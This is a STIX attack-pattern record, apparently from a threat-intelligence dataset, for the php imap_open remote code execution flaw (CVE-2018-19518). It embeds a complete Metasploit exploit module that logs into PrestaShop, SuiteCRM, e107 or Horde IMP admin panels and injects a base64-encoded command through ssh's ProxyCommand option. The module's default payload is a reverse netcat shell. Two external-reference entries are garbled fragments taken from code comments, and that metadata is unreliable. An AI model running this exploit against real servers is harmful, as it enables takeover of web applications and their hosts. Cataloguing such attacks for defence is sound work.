{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c1a6bbe-8c8e-4f93-b3c2-66b48853a892",
    "created": "2024-08-14T17:01:58.785577Z",
    "modified": "2024-08-14T17:01:58.785581Z",
    "name": "php imap_open Remote Code Execution",
    "description": " The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand option can be passed from imap_open to execute arbitrary commands. While many custom applications may use imap_open, this exploit works against the following applications: e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use. Prestashop exploitation requires the admin URI, and administrator credentials. suiteCRM/e107 require administrator credentials.  Fixed in php 5.6.39. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/php_imap_open_rce.rb",
            "external_id": "php_imap_open_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Bo0oM/PHP_imap_open_exploit"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.php.net/bug.php?id=76428"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-19518"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000859"
        },
        {
            "source_name": "#TokensaregeneratedforeachURLorsub-component",
            "external_id": "weneedvalidones!"
        },
        {
            "source_name": "print_error(UnabletofindtokenandredirectURL",
            "external_id": "checkoptions.)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'php imap_open Remote Code Execution',\n      'Description'     => %q{\n        The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an\n        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand\n        option can be passed from imap_open to execute arbitrary commands.\n        While many custom applications may use imap_open, this exploit works against the following applications:\n        e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.\n        Prestashop exploitation requires the admin URI, and administrator credentials.\n        suiteCRM/e107 require administrator credentials.  Fixed in php 5.6.39.\n      },\n      'Author' =>\n        [\n          'Anton Lopanitsyn', # Vulnerability discovery and PoC\n          'Twoster', # Vulnerability discovery and PoC\n          'h00die', # Metasploit Module\n          'Paolo Serracino', # Horde IMP EDB\n          'Pietro Minniti', # Horde IMP EDB\n          'Damiano Proietti' # Horde IMP EDB\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'URL', 'https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395' ],\n          [ 'URL', 'https://github.com/Bo0oM/PHP_imap_open_exploit' ],\n          [ 'EDB', '45865'],\n          # This claims all versions of Horde IMP are vuln, but only H3 (~2012) and possibly older are vuln.\n          [ 'EDB', '46136'],\n          [ 'URL', 'https://bugs.php.net/bug.php?id=76428'],\n          [ 'CVE', '2018-19518'],\n          [ 'CVE', '2018-1000859']\n        ],\n      'Privileged'  => false,\n      'Platform'  => [ 'unix' ],\n      'Arch'  => ARCH_CMD,\n      'Targets' =>\n        [\n          [ 'prestashop', {} ],\n          [ 'suitecrm', {}],\n          [ 'e107v2', {'WfsDelay' => 90}], # may need to wait for cron\n          [ 'Horde IMP H3', {}],\n          [ 'custom', {'WfsDelay' => 300}]\n        ],\n      'PrependFork' => true,\n      'DefaultOptions' =>\n        {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat',\n          'WfsDelay' => 120\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-10-23'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base directory path\", '/admin2769gx8k3']),\n        OptString.new('USERNAME', [ false, \"Username to authenticate with\", '']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", ''])\n      ])\n  end\n\n  def check\n    if target.name =~ /prestashop/\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({'uri' => uri})\n      if res && (res.code == 301 || res.code == 302)\n        return CheckCode::Detected\n      end\n    elsif target.name =~ /suitecrm/\n      #login page GET /index.php?action=Login&module=Users\n      vprint_status('Loading login page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'action' => 'Login',\n          'module' => 'Users'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 200\n        return CheckCode::Detected\n      end\n    elsif target.name =~ /Horde IMP H3/\n      res = send_request_cgi({'uri' => normalize_uri(target_uri.path, 'imp', 'test.php')})\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n      major, minor = res.body.scan(/PHP Major Version: (?<major>5\\.[1-6]{1})<\\/li>\\s+<li>PHP Minor Version: (?<minor>[\\d]?\\d)/).flatten\n      phpversion = \"#{major}.#{minor}\"\n      if res.code == 200 && res.body =~ /PHP Mail Server Support Test/ && phpversion != '.'\n        if Rex::Version.new(phpversion) < Rex::Version.new('5.6.39')\n          vprint_good(\"PHP Version #{phpversion} is vulnerable\")\n          return CheckCode::Appears\n        else\n          vprint_bad(\"PHP Version #{phpversion} is NOT vulnerable, patched in 5.6.39.\")\n        end\n      end\n    end\n  CheckCode::Safe\n  end\n\n  def command(spaces='$IFS$()')\n    #payload is base64 encoded, and stuffed into the SSH option.\n    enc_payload = Rex::Text.encode_base64(payload.encoded)\n    command = \"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"\n    #final payload can not contain spaces, however $IFS$() will return the space we require\n    command.gsub!(' ', spaces)\n  end\n\n  def exploit\n    if target.name =~ /prestashop/\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({'uri' => uri})\n      if res && res.code != 301\n        print_error('Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3')\n        return\n      end\n\n      #There are a bunch of redirects that happen, so we automate going through them to get to the login page.\n      while res.code == 301 || res.code == 302\n        cookie = res.get_cookies\n        uri = res.headers['Location']\n        vprint_status(\"Redirected to #{uri}\")\n        res = send_request_cgi({'uri' => uri})\n      end\n\n      #Tokens are generated for each URL or sub-component, we need valid ones!\n      /.*token=(?<token>\\w{32})/ =~ uri\n      /id=\"redirect\" value=\"(?<redirect>.*)\"\\/>/ =~ res.body\n      cookie = res.get_cookies\n\n      unless token && redirect\n        print_error('Unable to find token and redirect URL, check options.')\n        return\n      end\n\n      vprint_status(\"Token: #{token} and Login Redirect: #{redirect}\")\n      print_status(\"Logging in with #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_post' => {\n          'ajax' => 1,\n          'token' => '',\n          'controller' => 'AdminLogin',\n          'submitLogin' => '1',\n          'passwd' => datastore['PASSWORD'],\n          'email' => datastore['USERNAME'],\n          'redirect' => redirect\n        },\n        'vars_get' => {\n          'rand' => '1542582364810' #not sure if this will hold true forever, I didn't see where it is being generated\n        }\n      )\n      if res && res.body.include?('Invalid password')\n        print_error('Invalid Login')\n        return\n      end\n      vprint_status(\"Login JSON Response: #{res.body}\")\n      uri = JSON.parse(res.body)['redirect']\n      cookie = res.get_cookies\n      print_good('Login Success, loading admin dashboard to pull tokens')\n      res = send_request_cgi({'uri' => uri, 'cookie' => cookie})\n\n      /AdminCustomerThreads&amp;token=(?<token>\\w{32})/ =~ res.body\n      vprint_status(\"Customer Threads Token: #{token}\")\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'controller' => 'AdminCustomerThreads',\n          'token' => token\n        }\n      })\n\n      /form method=\"post\" action=\"index\\.php\\?controller=AdminCustomerThreads&amp;token=(?<token>\\w{32})/ =~ res.body\n      print_good(\"Sending Payload with Final Token: #{token}\")\n      data = Rex::MIME::Message.new\n      data.add_part('1', nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_FILE_UPLOAD\"')\n      data.add_part(\"Dear Customer,\\n\\nRegards,\\nCustomer service\", nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_SIGNATURE_1\"')\n      data.add_part(\"x #{command}}\", nil, nil, 'form-data; name=\"PS_SAV_IMAP_URL\"')\n      data.add_part('143', nil, nil, 'form-data; name=\"PS_SAV_IMAP_PORT\"')\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_USER\"')\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_PWD\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_DELETE_MSG\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_CREATE_THREADS\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_POP3\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NORSH\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_SSL\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_VALIDATE-CERT\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOVALIDATE-CERT\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_TLS\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOTLS\"')\n      data.add_part('', nil, nil, 'form-data; name=\"submitOptionscustomer_thread\"')\n\n      send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\n        'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n        'data'   => data.to_s,\n        'cookie' => cookie,\n        'vars_get' => {\n          'controller' => 'AdminCustomerThreads',\n          'token' => token\n        }\n      )\n      print_status('IMAP server change left on server, manual revert required.')\n\n      if res && res.body.include?('imap Is Not Installed On This Server')\n        print_error('PHP IMAP mod not installed/enabled ')\n      end\n    elsif target.name =~ /suitecrm/\n      #login page GET /index.php?action=Login&module=Users\n      vprint_status('Loading login page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'action' => 'Login',\n          'module' => 'Users'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 200\n        cookie = res.get_cookies\n      else\n        print_error(\"HTTP code #{res.code} found, check options.\")\n        return\n      end\n\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_post' => {\n          'module' => 'Users',\n          'action' => 'Authenticate',\n          'return_module' => 'Users',\n          'return_action' => 'Login',\n          'cant_login' => '',\n          'login_module' => '',\n          'login_action' => '',\n          'login_record' => '',\n          'login_token' => '',\n          'login_oauth_token' => '',\n          'login_mobile' => '',\n          'user_name' => datastore['USERNAME'],\n          'username_password' => datastore['PASSWORD'],\n          'Login' => 'Log+In'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 302\n        cookie = res.get_cookies\n        print_good('Login Success')\n      else\n        print_error('Failed Login, check options.')\n      end\n\n      #load the email settings page to get the group_id\n      vprint_status('Loading InboundEmail page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'module' => 'InboundEmail',\n          'action' => 'EditView'\n        }\n      )\n\n      unless res\n        print_error('Error loading site.')\n        return\n      end\n\n      /\"group_id\" value=\"(?<group_id>\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\">/ =~ res.body\n\n      unless group_id\n        print_error('Could not identify group_id from form page')\n        return\n      end\n\n      print_good(\"Sending payload with group_id #{group_id}\")\n\n      referer = \"http://#{datastore['RHOST']}#{normalize_uri(target_uri.path, 'index.php')}?module=InboundEmail&action=EditView\"\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        #required to prevent CSRF protection from triggering\n        'headers' => { 'Referer' => referer},\n        'vars_post' => {\n          'module' => 'InboundEmail',\n          'record' => '',\n          'origin_id' => '',\n          'isDuplicate' => 'false',\n          'action' => 'Save',\n          'group_id' => group_id,\n          'return_module' => '',\n          'return_action' => '',\n          'return_id' => '',\n          'personal' => '',\n          'searchField' => '',\n          'mailbox_type' => '',\n          'button' => '  Save  ',\n          'name' => Rex::Text.rand_text_alphanumeric(8),\n          'status' => 'Active',\n          'server_url' => \"x #{command}}\",\n          'email_user' => Rex::Text.rand_text_alphanumeric(8),\n          'protocol' => 'imap',\n          'email_password' => Rex::Text.rand_text_alphanumeric(8),\n          'port' => '143',\n          'mailbox' => 'INBOX',\n          'trashFolder' => 'TRASH',\n          'sentFolder' => '',\n          'from_name' => Rex::Text.rand_text_alphanumeric(8),\n          'is_auto_import' => 'on',\n          'from_addr' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\n          'reply_to_name' => '',\n          'distrib_method' => 'AOPDefault',\n          'distribution_user_name' => '',\n          'distribution_user_id' => '',\n          'distribution_options[0]' => 'all',\n          'distribution_options[1]' => '',\n          'distribution_options[2]' => '',\n          'create_case_template_id' => '',\n          'reply_to_addr' => '',\n          'template_id' => '',\n          'filter_domain' => '',\n          'email_num_autoreplies_24_hours' => '10',\n          'leaveMessagesOnMailServer' => '1'\n        }\n      )\n      if res && res.code == 200\n        print_error('Triggered CSRF protection, may try exploitation manually.')\n      end\n      print_status('IMAP server config left on server, manual removal required.')\n    elsif target.name =~ /Horde IMP H3/\n      # The original EDB module claims \"Version: All IMP versions\", however the current\n      # major branch https://github.com/horde/imp/tree/74e3f5fdbac31dfcff15195832c1b9b888767982\n      # does not include any reference to imap_open, nor 'test.php' in the root directory.\n      # H5 (current) uses the IMP test url: /horde/test.php?app=imp with \"Mail Server Support Test\"\n      #    as the header:\n      #    https://github.com/horde/imp/blob/16400fd5f52610d27d59d21fe2e39db2c85837f1/lib/Test.php#L85\n      # H3 (~2012) uses the IMP test url: /horde/imp/test.php and \"PHP Mail Server Support Test\"\n      #    which are the values coded into the python edb exploit.\n      print_status(\"Sending Exploit Request\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'imp', 'test.php'),\n        'vars_post' => {\n          'f_submit'    => 'Submit',\n          'passwd'      => Rex::Text.rand_text_alphanumeric(8),\n          'port'        => '143',\n          'server'      => \"x #{command}}\",\n          'server_type' => 'imap',\n          'user'        => Rex::Text.rand_text_alphanumeric(8)\n      })\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n    elsif target.name =~ /e107v2/\n      # e107 has an encoder which prevents $IFS$() from being used as $ = &#036;\n      # \\t also became /t, however \"\\t\" does seem to work.\n\n      # e107 also uses a cron job to check bounce jobs, which may not be active.\n      # either cron can be disabled, or bounce checks disabled, so we try to\n      # kick the process manually, however if it doesn't work we'll hope\n      # cron is running and we get a call back anyways.\n\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'admin.php'),\n        'vars_post' => {\n          'authname' => datastore['USERNAME'],\n          'authpass' => datastore['PASSWORD'],\n          'authsubmit' => 'Log In'\n      })\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code == 302\n        cookie = res.get_cookies\n        print_good('Login Success')\n      else\n        print_error('Failed Login, check options.')\n      end\n\n      vprint_status('Checking if Cron is enabled for triggering')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n        'cookie' => cookie\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n      if res.body.include? 'Status: <b>Disabled</b>'\n        print_error('Cron disabled, unexploitable.')\n        return\n      end\n\n      print_good('Storing payload in mail settings')\n\n      # the imap/pop field is hard to find. Check Users > Mail\n      # then check \"Bounced emails - Processing method\" and set it to \"Mail account\"\n      send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'mailout.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'mode' => 'prefs',\n          'action' => 'prefs'\n        },\n        'vars_post' => {\n          'testaddress' => 'none@none.com',\n          'testtemplate' => 'textonly',\n          'bulkmailer' => 'smtp',\n          'smtp_server' => '1.1.1.1',\n          'smtp_username' => 'username',\n          'smtp_password' => 'password',\n          'smtp_port' => '25',\n          'smtp_options' => '',\n          'smtp_keepalive' => '0',\n          'smtp_useVERP' => '0',\n          'mail_sendstyle' => 'texthtml',\n          'mail_pause' => '3',\n          'mail_pausetime' => '4',\n          'mail_workpertick' => '5',\n          'mail_log_option' => '0',\n          'mail_bounce' => 'mail',\n          'mail_bounce_email2' => '',\n          'mail_bounce_email' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\n          'mail_bounce_pop3' => \"x #{command(\"\\t\")}}\",\n          'mail_bounce_user' => Rex::Text.rand_text_alphanumeric(8),\n          'mail_bounce_pass' => Rex::Text.rand_text_alphanumeric(8),\n          'mail_bounce_type' => 'imap',\n          'mail_bounce_auto' => '1',\n          'updateprefs' => 'Save Changes'\n      })\n\n\n      vprint_status('Loading cron page to execute job manually')\n      res =  send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n        'cookie' => cookie\n      )\n\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if /name='e-token' value='(?<etoken>\\w{32})'/ =~ res.body && /_system::procEmailBounce.+?cron_execute\\[(?<cron_id>\\d)\\]/m =~ res.body\n        print_good(\"Triggering manual run of mail bounch check cron to execute payload with cron id #{cron_id} and etoken #{etoken}\")\n        # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes\n        send_request_cgi(\n          'method' => 'POST',\n          'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n          'cookie' => cookie,\n          'vars_post' => {\n            'e-token' => etoken,\n            #'e-columns[]' => 'cron_category',\n            'e-columns[]' => 'cron_name',\n            #'e-columns[]' => 'cron_description',\n            #'e-columns[]' => 'cron_function',\n            #'e-columns[]' => 'cron_tab',\n            #'e-columns[]' => 'cron_lastrun',\n            #'e-columns[]' => 'cron_active',\n            \"cron_execute[#{cron_id}]\" => '1',\n            'etrigger_batch' => ''\n        })\n\n      else\n        print_error('e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.')\n      end\n\n      print_status('IMAP server config left on server, manual removal required.')\n    elsif target.name =~ /custom/\n      print_status('Listener started for 300 seconds')\n      print_good(\"POST request connection string: x #{command}}\")\n      # URI.encode leaves + as + since that's a space encoded.  So we manually change it.\n      print_good(\"GET request connection string: #{URI::DEFAULT_PARSER.escape(\"x \" + command + \"}\").sub! '+', '%2B'}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-23",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}